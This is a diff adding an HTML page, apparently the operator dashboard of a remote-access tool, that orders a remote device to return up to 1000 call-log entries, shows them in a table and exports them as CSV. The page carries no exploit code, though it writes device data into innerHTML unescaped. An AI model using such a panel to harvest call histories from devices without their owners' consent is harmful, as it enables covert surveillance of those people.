@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Logs - Remote Access</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f0f2f5;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            margin: 0;
+            color: #333;
+        }
+
+        .log-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .log-table th,
+        .log-table td {
+            text-align: left;
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .log-table th {
+            color: #666;
+            font-weight: 600;
+            background: #f9fafb;
+        }
+
+        .type-incoming {
+            color: #10b981;
+            font-weight: bold;
+        }
+
+        .type-outgoing {
+            color: #3b82f6;
+            font-weight: bold;
+        }
+
+        .type-missed {
+            color: #ef4444;
+            font-weight: bold;
+        }
+
+        .type-rejected {
+            color: #f59e0b;
+            font-weight: bold;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            color: white;
+            background: #3b82f6;
+            transition: 0.2s;
+            font-size: 14px;
+        }
+
+        .btn:hover {
+            background: #2563eb;
+        }
+
+        .btn:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .btn-load-more {
+            width: 100%;
+            margin-top: 20px;
+            padding: 12px;
+            background: #10b981;
+        }
+
+        .btn-load-more:hover:not(:disabled) {
+            background: #059669;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .stats {
+            text-align: center;
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .stats strong {
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+    <a href="index.html" class="back-link">← Back to Dashboard</a>
+    <div class="container">
+        <div class="header-row">
+            <h1>📞 Call Logs</h1>
+            <button class="btn" onclick="exportLogs()">📥 Export CSV</button>
+        </div>
+        <div class="stats" id="stats"></div>
+        <div id="logs-container" class="loading">Loading call logs...</div>
+        <button id="load-more-btn" class="btn btn-load-more" onclick="loadMoreLogs()" style="display:none">
+            Load More (50)
+        </button>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let allLogs = [];
+        let displayedCount = 0;
+        const LOGS_PER_PAGE = 50;
+
+        async function loadLogs() {
+            try {
+                const response = await api.sendCommand(deviceId, 'call_logs', { limit: 1000 });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    allLogs = response.data.data || [];
+                    displayedCount = 0;
+                    renderInitialLogs();
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to load call logs');
+                }
+            } catch (error) {
+                document.getElementById('logs-container').innerHTML = `<p style="color:red">Error: ${error.message}</p>`;
+            }
+        }
+
+        function renderInitialLogs() {
+            const container = document.getElementById('logs-container');
+            const loadMoreBtn = document.getElementById('load-more-btn');
+
+            if (allLogs.length === 0) {
+                container.innerHTML = '<p style="text-align:center">No call logs found.</p>';
+                loadMoreBtn.style.display = 'none';
+                updateStats();
+                return;
+            }
+
+            // Show first 50 logs
+            displayedCount = Math.min(LOGS_PER_PAGE, allLogs.length);
+            renderLogs();
+
+            // Show/hide Load More button
+            loadMoreBtn.style.display = displayedCount < allLogs.length ? 'block' : 'none';
+            updateStats();
+        }
+
+        function loadMoreLogs() {
+            const loadMoreBtn = document.getElementById('load-more-btn');
+            loadMoreBtn.disabled = true;
+            loadMoreBtn.textContent = 'Loading...';
+
+            // Simulate slight delay for better UX
+            setTimeout(() => {
+                displayedCount = Math.min(displayedCount + LOGS_PER_PAGE, allLogs.length);
+                renderLogs();
+
+                // Update button state
+                if (displayedCount >= allLogs.length) {
+                    loadMoreBtn.style.display = 'none';
+                } else {
+                    loadMoreBtn.disabled = false;
+                    loadMoreBtn.textContent = `Load More (${LOGS_PER_PAGE})`;
+                }
+
+                updateStats();
+            }, 300);
+        }
+
+        function renderLogs() {
+            const container = document.getElementById('logs-container');
+            const logsToDisplay = allLogs.slice(0, displayedCount);
+
+            let html = `
+                <table class="log-table">
+                    <thead>
+                        <tr>
+                            <th>Number</th>
+                            <th>Type</th>
+                            <th>Date</th>
+                            <th>Duration (s)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            html += logsToDisplay.map(log => {
+                let typeClass = '';
+                if (log.type.includes('INCOMING')) typeClass = 'type-incoming';
+                else if (log.type.includes('OUTGOING')) typeClass = 'type-outgoing';
+                else if (log.type.includes('MISSED')) typeClass = 'type-missed';
+                else if (log.type.includes('REJECTED')) typeClass = 'type-rejected';
+
+                return `
+                    <tr>
+                        <td>${log.number}</td>
+                        <td class="${typeClass}">${log.type}</td>
+                        <td>${log.date}</td>
+                        <td>${log.duration}</td>
+                    </tr>
+                `;
+            }).join('');
+
+            html += '</tbody></table>';
+            container.innerHTML = html;
+        }
+
+        function updateStats() {
+            const statsDiv = document.getElementById('stats');
+            if (allLogs.length > 0) {
+                statsDiv.innerHTML = `Showing <strong>${displayedCount}</strong> of <strong>${allLogs.length}</strong> call logs`;
+            } else {
+                statsDiv.innerHTML = '';
+            }
+        }
+
+        async function exportLogs() {
+            try {
+                const response = await api.sendCommand(deviceId, 'call_logs_export', { format: 'csv' });
+                if (response.success && response.data && response.data.status === 'success') {
+                    api.downloadFile(deviceId, response.data.path);
+                    api.showToast('Exporting call logs...', 'success');
+                } else {
+                    throw new Error(response.error || response.data?.error);
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        loadLogs();
+    </script>
+</body>
+
+</html>
